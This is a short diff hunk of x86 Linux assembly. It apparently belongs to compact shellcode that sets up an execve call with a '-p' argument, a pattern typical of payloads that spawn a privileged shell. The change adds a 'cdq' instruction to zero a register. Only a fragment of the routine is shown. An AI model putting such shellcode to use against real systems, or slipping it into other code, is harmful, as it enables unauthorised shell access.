@@ -8,6 +8,7 @@ section .text
 _start:
 	push byte 0xb
 	pop eax
+	cdq
 	push edx		
 	push word 0x702d	;"-p"
 	mov ecx,esp		
